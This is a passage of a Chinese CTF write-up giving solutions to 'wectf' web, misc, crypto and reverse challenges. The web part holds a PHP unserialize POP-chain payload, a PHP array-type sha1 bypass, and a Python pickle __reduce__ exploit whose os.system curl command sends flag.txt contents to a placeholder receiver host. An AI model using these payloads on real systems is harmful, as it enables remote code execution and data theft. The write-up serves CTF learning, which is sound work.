class="variable">$a</span>-&gt;value=<span class="keyword">new</span> Call();</span><br><span class="line"><span class="variable">$a</span>-&gt;value-&gt;value=<span class="keyword">new</span> Func_t();</span><br><span class="line"><span class="variable">$a</span>-&gt;value-&gt;value-&gt;value=<span class="keyword">new</span> Func_m();</span><br><span class="line"><span class="variable">$a</span>-&gt;value-&gt;value-&gt;value-&gt;value1=<span class="keyword">new</span> ina();</span><br><span class="line"><span class="variable">$a</span>-&gt;value-&gt;value-&gt;value-&gt;value1-&gt;value=<span class="keyword">new</span> GetFlag();</span><br><span class="line"><span class="keyword">print</span>(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//O:4:&quot;O00O&quot;:1:&#123;s:5:&quot;value&quot;;O:4:&quot;Call&quot;:1:&#123;s:5:&quot;value&quot;;O:6:&quot;Func_t&quot;:1:&#123;s:5:&quot;value&quot;;O:6:&quot;Func_m&quot;:2:&#123;s:6:&quot;value1&quot;;O:3:&quot;ina&quot;:1:&#123;s:5:&quot;value&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;&#125;s:6:&quot;value2&quot;;N;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>先GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;1</span><br></pre></td></tr></table></figure><p>再POST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;O:4:&quot;O00O&quot;:1:&#123;s:5:&quot;value&quot;;O:4:&quot;Call&quot;:1:&#123;s:5:&quot;value&quot;;O:6:&quot;Func_t&quot;:1:&#123;s:5:&quot;value&quot;;O:6:&quot;Func_m&quot;:2:&#123;s:6:&quot;value1&quot;;O:3:&quot;ina&quot;:1:&#123;s:5:&quot;value&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;&#125;s:6:&quot;value2&quot;;N;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;unserialize_php_O00O&#125;</span><br></pre></td></tr></table></figure><h2 id="high03"><a href="#high03" class="headerlink" title="high03"></a>high03</h2><p>给了附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        a = request.form[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">        pickle.loads(a)</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        username = <span class="string">&quot;guest&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hostname : %s &quot;</span> % username</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>python反序列化。<br>写脚本  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;curl http://x.x.x.x?`cat flag.txt`&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = pickle.dumps(exp())</span><br><span class="line">    payload = &#123;</span><br><span class="line">            <span class="string">&#x27;a&#x27;</span>:<span class="built_in">str</span>(data)&#125;</span><br><span class="line">    r = requests.post(<span class="string">&quot;http://119.23.236.68:63008/&quot;</span>,data=payload)</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure><p>一开始执行cat flag.txt，但是并不会返回到页面上，所以直接把flag当参数去请求xss接收平台，然后在后台拿到flag<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007093921.png" alt="">  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;just_fanxuliehua_python&#125;</span><br></pre></td></tr></table></figure><h2 id="easy03"><a href="#easy03" class="headerlink" title="easy03"></a>easy03</h2><p>消息头直接看到flag<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007094226.png" alt=""></p><h2 id="medium03"><a href="#medium03" class="headerlink" title="medium03"></a>medium03</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;source.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;wectf&#123;xxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;exit&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) === sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$name</span> = urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> === <span class="string">&#x27;wectf!@#$wectf&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) === sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])</span><br></pre></td></tr></table></figure><p>可以用数组类型去绕过  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">username[]&#x3D;a</span><br><span class="line">POST</span><br><span class="line">password[]&#x3D;b</span><br></pre></td></tr></table></figure><p>然后  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这里需要对wectf!@#$wectf进行两次url编码,浏览器解码一次，php解码一次  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;wectf!%2540%2523%2524wectf</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;e2e123acef456789d132f456c13&#125;</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;xxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line"><span class="built_in">print</span> flag.encode(<span class="string">&#x27;rot13&#x27;</span>)</span><br><span class="line"><span class="comment">#jrpgs&#123;E0g13_fb_rnfl_jr1p0zr_gb_jrpgs&#125;</span></span><br></pre></td></tr></table></figure><p>直接decode(‘rot13’)即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;R0t13_so_easy_we1c0me_to_wectf&#125;</span><br></pre></td></tr></table></figure><h2 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h2><p>你听说过大名鼎鼎的贝斯（base）家族吗？<br>4D515A464D32544549354E444F574C4B4B4A35465556525950424D57594F4B474A565744514D535A4C415944323D3D3D<br>使用base16 32 64依次解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;b4se_1b_E2_6a&#125;</span><br></pre></td></tr></table></figure><h2 id="babypcap"><a href="#babypcap" class="headerlink" title="babypcap"></a>babypcap</h2><p>简单流量分析<br>下载附件，wireshark打开<br>先过滤出http协议，然后追踪tcp流，胡乱分析。<br>最后切换到tcp流1的时候看到flag<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007100048.png" alt=""></p><h2 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h2><p>77656374667b315f346d5f66346b655f08080808085f666c34677d<br>直接hex解码<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007100321.png" alt=""><br>但是<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007123025.png" alt=""><br>将乱码删掉，提交，不行。<br>再把f4ke删掉得到正确flag，真就猜呗。  </p><h2 id="这是个啥东西"><a href="#这是个啥东西" class="headerlink" title="这是个啥东西"></a>这是个啥东西</h2><p>下载附件发现是张png，打不开。<br>winhex打开，修复文件头，找一张正常的png对比修复。<br>修复完正常打开。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007100651.png" alt="">  </p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>flag在群公告</p><h2 id="老套的md5"><a href="#老套的md5" class="headerlink" title="老套的md5"></a>老套的md5</h2><p>小明泼墨水了，墨水泼到 wectf 的flag上面了，明文中有三个字符被挡住了，巧的很，明文的md5值咱们知道，而且他没有被泼墨水，简单了吧  </p><p>明文：wectf{ab?def?hijklm?opq}           </p><p>密文：84e7ab5946fb4c5d94ed891c42d5fac6  </p><p>md5_exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(s.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">            s = <span class="string">&quot;wectf&#123;ab&quot;</span> + i + <span class="string">&quot;def&quot;</span> + j + <span class="string">&quot;hijklm&quot;</span> + k + <span class="string">&quot;opq&#125;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> md5(s) == <span class="string">&quot;84e7ab5946fb4c5d94ed891c42d5fac6&quot;</span>:</span><br><span class="line">                print(s)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20191007101414.png" alt="">  </p><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>下载附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line">flag = raw_input(<span class="string">&quot;flag : &quot;</span>)</span><br><span class="line">tmp = bytes_to_long(flag)</span><br><span class="line">n = <span class="number">47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="built_in">pow</span>(tmp, e, n)</span><br><span class="line"><span class="keyword">if</span> c == <span class="number">1495572858946434740124351882099461657145759077753704214627609673423129831012766355967962871807110976347627163520955975614562262871102943487213224386685367602432775269</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;you get it!&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Too Young, Too simple!&quot;</span></span><br></pre></td></tr></table></figure><p>e=3，密文开三次方即是明文<br>rsa_exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line">c=<span class="number">1495572858946434740124351882099461657145759077753704214627609673423129831012766355967962871807110976347627163520955975614562262871102943487213224386685367602432775269</span></span><br><span class="line">n=<span class="number">47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy.root(c+i*n, <span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span> gmpy.root(c+i*n, <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20191007101455.png" alt=""><br>将根转16进制后hex解码<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007101558.png" alt=""></p><h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p>密文：U2FsdGVkX19x8Dq5FttochQw/lMz8C5gFD6PQjKZvtxBjb0Sab8cIqXqBpMne5vx<br>直接aes解密<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007101806.png" alt=""></p><h2 id="cxk-xcp"><a href="#cxk-xcp" class="headerlink" title="cxk=xcp"></a>cxk=xcp</h2><p>下载附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lowercase = <span class="string">&quot;abcdefghijklnmopqrstuvqxyz&quot;</span></span><br><span class="line">uppercase = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVQXYZ&quot;</span></span><br><span class="line">digest = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line">plaintext = <span class="string">&quot;what are you doing? you can join crypt group. flag is wectf&#123;xxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">    <span class="keyword">if</span> plaintext[i] <span class="keyword">in</span> lowercase:</span><br><span class="line">        enc = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + (<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) - <span class="built_in">ord</span>(plaintext[i])) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">elif</span> plaintext[i] <span class="keyword">in</span> uppercase:</span><br><span class="line">        enc = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + (<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) - <span class="built_in">ord</span>(plaintext[i])) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">elif</span> plaintext[i] <span class="keyword">in</span> digest:</span><br><span class="line">        enc = <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) + (<span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) - <span class="built_in">ord</span>(plaintext[i])) % <span class="number">10</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        enc = <span class="built_in">ord</span>(plaintext[i])</span><br><span class="line">    ciphertext += <span class="built_in">chr</span>(enc)</span><br><span class="line">print(ciphertext)</span><br><span class="line"><span class="comment">## ciphertext : wszg ziv blf wlrmt? blf xzm qlrm xibkg tilfk. uozt rh wvxgu&#123;hzev_h5ev_nv&#125;</span></span><br></pre></td></tr></table></figure><p>直接改脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits</span><br><span class="line">lowercase = <span class="string">&quot;abcdefghijklnmopqrstuvqxyz&quot;</span></span><br><span class="line">uppercase = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVQXYZ&quot;</span></span><br><span class="line">digest = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line">plaintext = <span class="string">&quot;what are you doing? you can join crypt group. flag is wectf&#123;xxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">    <span class="keyword">if</span> plaintext[i] <span class="keyword">in</span> lowercase:</span><br><span class="line">        enc = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + (<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) - <span class="built_in">ord</span>(plaintext[i])) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">elif</span> plaintext[i] <span class="keyword">in</span> uppercase:</span><br><span class="line">        enc = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + (<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) - <span class="built_in">ord</span>(plaintext[i])) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">elif</span> plaintext[i] <span class="keyword">in</span> digest:</span><br><span class="line">        enc = <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) + (<span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) - <span class="built_in">ord</span>(plaintext[i])) % <span class="number">10</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        enc = <span class="built_in">ord</span>(plaintext[i])</span><br><span class="line">    ciphertext += <span class="built_in">chr</span>(enc)</span><br><span class="line">print(ciphertext)</span><br><span class="line"><span class="comment">## ciphertext : wszg ziv blf wlrmt? blf xzm qlrm xibkg tilfk. uozt rh wvxgu&#123;hzev_h5ev_nv&#125;</span></span><br><span class="line">print(dic)</span><br><span class="line">ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">    <span class="keyword">if</span> dic[i] <span class="keyword">in</span> lowercase:</span><br><span class="line">        enc = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + (<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) - <span class="built_in">ord</span>(dic[i])) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">elif</span> dic[i] <span class="keyword">in</span> uppercase:</span><br><span class="line">        enc = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + (<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) - <span class="built_in">ord</span>(dic[i])) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">elif</span> dic[i] <span class="keyword">in</span> digest:</span><br><span class="line">        enc = <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) + (<span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) - <span class="built_in">ord</span>(dic[i])) % <span class="number">10</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        enc = <span class="built_in">ord</span>(dic[i])</span><br><span class="line">    ciphertext += <span class="built_in">chr</span>(enc)</span><br><span class="line">print(ciphertext)</span><br></pre></td></tr></table></figure><p>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<br>zyxwvutsrqponmlkjihgfewcbaZYXWVUTSRQPONMLKJIHGFEWCBA9876543210<br>得到处理后的映射关系<br>对照密文还原明文  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;save_s4ve_me&#125;</span><br></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="xor-linux"><a href="#xor-linux" class="headerlink" title="xor_linux"></a>xor_linux</h2><p>下载附件<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007102533.png" alt=""><br>简单异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;vdbugzy1s^r1^d5rx|&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;x0r_s0_e4sy&#125;</span><br></pre></td></tr></table></figure><h2 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20191007102943.png" alt=""><br>有strcmp动作，跟进直接看到分段的flag<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007103029.png" alt=""></p><h2 id="assembly"><a href="#assembly" class="headerlink" title="assembly"></a>assembly</h2><p>汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 10h</span><br><span class="line">mov     [rbp+var_4], 0</span><br><span class="line">jmp     short s1</span><br><span class="line"></span><br><span class="line">s2:</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">movzx   eax, s[rax]</span><br><span class="line">add     eax, 14h</span><br><span class="line">mov     edx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     s[rax], dl</span><br><span class="line">add     [rbp+var_4], 1</span><br><span class="line"></span><br><span class="line">s1:</span><br><span class="line">cmp     [rbp+var_4], 25h</span><br><span class="line">jle     short s2</span><br><span class="line">mov     esi, offset s</span><br><span class="line">mov     edi, offset format ; &quot;%s&quot;</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _printf</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">s的数据为:</span><br><span class="line">52 58 4D 53 67 51 22 4F  1C 52 23 4E 52 1C 50 4D 1F 52 1D 4F 23 23 4F 22  50 4F 4E 4F 23 1D 4D 20 21 1c 4d 21 1e 69</span><br></pre></td></tr></table></figure><p>给一个变量赋值为0，然后跳到s1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp     [rbp+var_4], 25h</span><br><span class="line">jle     short s2</span><br></pre></td></tr></table></figure><p>当var_4小于等于25h即十进制的37时调用s2，这个是循环38次，看一下s的数据刚好有38个，跟进s2分析。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s2:</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">movzx   eax, s[rax]</span><br><span class="line">add     eax, 14h</span><br><span class="line">mov     edx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     s[rax], dl</span><br><span class="line">add     [rbp+var_4], 1</span><br></pre></td></tr></table></figure><p>s2中对传进来的字符加14h即20，所以我们只需要将s的数据减去20即可。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 